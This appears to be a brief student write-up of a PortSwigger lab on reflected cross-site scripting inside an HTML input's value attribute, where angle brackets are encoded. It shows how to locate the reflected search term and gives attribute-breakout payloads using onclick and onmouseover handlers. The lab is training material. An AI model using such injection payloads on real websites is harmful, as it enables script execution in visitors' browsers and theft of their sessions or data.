# Lab: Reflected XSS into attribute with angle brackets HTML-encoded
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

```bash
# Search

abc1234

# After that view page source and look for abc1234

 <h1>0 search results for 'abc1234'</h1>

<input type=text placeholder='Search the blog...' name=search value="abc1234">
```

```bash
<input type=text placeholder='Search the blog...' name=search value="abc1234">

# search this
"onclick='alert(1)'

# click to searchbox to activate onclick.
  
# You can also search this too these events are working in <input>

"onmouseover= 'alert()'

```

